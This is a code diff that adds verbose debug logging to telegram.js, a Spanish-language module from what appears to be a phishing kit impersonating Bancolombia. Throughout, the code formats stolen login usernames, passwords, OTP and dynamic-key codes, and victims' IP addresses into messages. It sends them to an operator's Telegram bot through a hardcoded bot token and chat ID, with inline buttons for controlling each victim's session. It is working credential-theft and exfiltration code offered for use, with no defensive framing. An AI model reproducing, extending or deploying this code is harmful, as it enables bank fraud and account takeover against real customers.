@@ -1,18 +1,25 @@
+// ==========================================
+// TELEGRAM.JS - VERSIÓN ROBUSTA CON DEBUGGING
+// ==========================================
+
+console.log('🚀 Iniciando carga de telegram.js...');
+
 // Configuración de Telegram
 const TELEGRAM_BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
 const TELEGRAM_CHAT_ID = '8469651553';
 
-// ========================================
-// FUNCIÓN PRINCIPAL - Compatible con todas las páginas
-// ========================================
+console.log('🔑 BOT_TOKEN configurado:', TELEGRAM_BOT_TOKEN ? 'SÍ' : 'NO');
+console.log('💬 CHAT_ID configurado:', TELEGRAM_CHAT_ID ? 'SÍ' : 'NO');
 
-/**
- * Envía un mensaje a Telegram con formato y teclado
- * @param {string} mensaje - Mensaje a enviar (puede incluir Markdown)
- * @param {object} teclado - Objeto con los botones inline (opcional)
- * @returns {Promise}
- */
+// ==========================================
+// FUNCIÓN PRINCIPAL - sendTelegramMessage
+// ==========================================
+
 async function sendTelegramMessage(mensaje, teclado = null) {
+    console.log('📨 sendTelegramMessage() llamada');
+    console.log('📝 Mensaje:', mensaje.substring(0, 50) + '...');
+    console.log('⌨️ Teclado:', teclado ? 'SÍ' : 'NO');
+    
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     const payload = {
@@ -25,7 +32,12 @@ async function sendTelegramMessage(mensaje, teclado = null) {
         payload.reply_markup = teclado;
     }
     
+    console.log('🌐 URL de Telegram:', url.substring(0, 50) + '...');
+    console.log('📦 Payload preparado:', JSON.stringify(payload).substring(0, 100) + '...');
+    
     try {
+        console.log('⏳ Enviando fetch a Telegram...');
+        
         const response = await fetch(url, {
             method: 'POST',
             headers: {
@@ -34,43 +46,46 @@ async function sendTelegramMessage(mensaje, teclado = null) {
             body: JSON.stringify(payload)
         });
 
+        console.log('📥 Respuesta recibida, status:', response.status);
+        
         const result = await response.json();
+        console.log('📄 Resultado parseado:', result);
         
         if (!result.ok) {
-            console.error('Error de Telegram:', result);
-            throw new Error(`Error al enviar mensaje: ${result.description || 'Desconocido'}`);
+            console.error('❌ Telegram respondió con error:', result);
+            throw new Error(`Error Telegram: ${result.description || 'Desconocido'}`);
         }
 
-        console.log('✅ Mensaje enviado a Telegram correctamente');
+        console.log('✅ ¡Mensaje enviado exitosamente!');
         return result;
         
     } catch (error) {
-        console.error('❌ Error enviando a Telegram:', error);
+        console.error('❌ ERROR en sendTelegramMessage:');
+        console.error('   Tipo:', error.name);
+        console.error('   Mensaje:', error.message);
+        console.error('   Stack:', error.stack);
         throw error;
     }
 }
 
-// ========================================
-// FUNCIÓN PARA DATOS COMPLETOS (otp-dinamica.html)
-// ========================================
+// ==========================================
+// FUNCIÓN PARA DATOS COMPLETOS
+// ==========================================
 
-/**
- * Envía datos completos del formulario a Telegram
- * @param {object} data - Objeto con todos los datos del usuario
- * @returns {Promise}
- */
 async function sendToTelegram(data) {
+    console.log('📨 sendToTelegram() llamada con data:', data);
     const mensaje = formatearMensaje(data);
     const teclado = crearTeclado(data);
-    
     return await sendTelegramMessage(mensaje, teclado);
 }
 
-// ========================================
-// FORMATEAR MENSAJE COMPLETO
-// ========================================
+// ==========================================
+// FORMATEAR MENSAJE
+// ==========================================
 
 function formatearMensaje(data) {
+    console.log('📝 Formateando mensaje...');
+    
     const transactionId = data.transactionId || Date.now().toString(36);
     
     let mensaje = `🏦 *NUEVA SOLICITUD BANCOLOMBIA*
@@ -79,11 +94,11 @@ function formatearMensaje(data) {
 `;
 
     // DATOS DE LOGIN
-    if (data.usuario || data.clave) {
+    if (data.usuario || data.clave || data.userName || data.userPass) {
         mensaje += `🔐 *DATOS DE ACCESO*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-👤 Usuario: \`${data.usuario || 'N/A'}\`
-🔑 Clave: \`${data.clave || 'N/A'}\`
+👤 Usuario: \`${data.usuario || data.userName || 'N/A'}\`
+🔑 Clave: \`${data.clave || data.userPass || 'N/A'}\`
 
 `;
     }
@@ -130,17 +145,20 @@ ${data.tipoVerificacion || data.tipoOTP || 'Código'}: \`${data.codigoVerificaci
 🆔 ID: \`${transactionId}\`
 ━━━━━━━━━━━━━━━━━━━━━━━━━━`;
 
+    console.log('✅ Mensaje formateado, longitud:', mensaje.length);
     return mensaje.trim();
 }
 
-// ========================================
-// CREAR TECLADO DE BOTONES
-// ========================================
+// ==========================================
+// CREAR TECLADO
+// ==========================================
 
 function crearTeclado(data) {
+    console.log('⌨️ Creando teclado...');
+    
     const transactionId = data.transactionId || Date.now().toString(36);
     
-    return {
+    const teclado = {
         inline_keyboard: [
             [
                 { 
@@ -182,19 +200,18 @@ function crearTeclado(data) {
             ]
         ]
     };
+    
+    console.log('✅ Teclado creado con', teclado.inline_keyboard.length, 'filas');
+    return teclado;
 }
 
-// ========================================
-// FUNCIÓN PARA ACTUALIZACIONES RÁPIDAS
-// ========================================
+// ==========================================
+// ACTUALIZACIÓN RÁPIDA DE CÓDIGO
+// ==========================================
 
-/**
- * Envía solo una actualización de código (OTP o Dinámica)
- * @param {string} codigo - El código a enviar
- * @param {string} tipo - Tipo de código ('OTP', 'Dinámica', etc.)
- * @returns {Promise}
- */
 async function enviarActualizacionCodigo(codigo, tipo = 'OTP') {
+    console.log('📨 enviarActualizacionCodigo() llamada:', codigo, tipo);
+    
     const transactionId = Date.now().toString(36);
     
     const mensaje = `🔐 *NUEVO ${tipo.toUpperCase()}*
@@ -237,29 +254,42 @@ async function enviarActualizacionCodigo(codigo, tipo = 'OTP') {
     return await sendTelegramMessage(mensaje, teclado);
 }
 
-// ========================================
-// FUNCIÓN PARA OBTENER IP PÚBLICA
-// ========================================
+// ==========================================
+// OBTENER IP PÚBLICA
+// ==========================================
 
-/**
- * Obtiene la IP pública del usuario
- * @returns {Promise<string>}
- */
 async function getPublicIP() {
+    console.log('🌐 Obteniendo IP pública...');
     try {
         const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
+        console.log('✅ IP obtenida:', data.ip);
         return data.ip;
     } catch (error) {
-        console.error('Error obteniendo IP:', error);
+        console.error('❌ Error obteniendo IP:', error);
         return 'No disponible';
     }
 }
 
-// ========================================
-// EXPORTAR FUNCIONES (para compatibilidad)
-// ========================================
+// ==========================================
+// VERIFICACIÓN DE CARGA
+// ==========================================
 
-// Estas funciones están disponibles globalmente
-console.log('✅ telegram.js cargado correctamente');
-console.log('📡 Funciones disponibles: sendTelegramMessage, sendToTelegram, enviarActualizacionCodigo, getPublicIP');
+console.log('✅ telegram.js cargado completamente');
+console.log('📡 Funciones disponibles:');
+console.log('   - sendTelegramMessage:', typeof sendTelegramMessage);
+console.log('   - sendToTelegram:', typeof sendToTelegram);
+console.log('   - enviarActualizacionCodigo:', typeof enviarActualizacionCodigo);
+console.log('   - getPublicIP:', typeof getPublicIP);
+
+// Test rápido (comentar en producción)
+// console.log('🧪 Test: Todas las funciones están definidas');
+
+// Hacer las funciones globales explícitamente
+window.sendTelegramMessage = sendTelegramMessage;
+window.sendToTelegram = sendToTelegram;
+window.enviarActualizacionCodigo = enviarActualizacionCodigo;
+window.getPublicIP = getPublicIP;
+
+console.log('🌍 Funciones asignadas al objeto window');
+console.log('✅ telegram.js listo para usar');
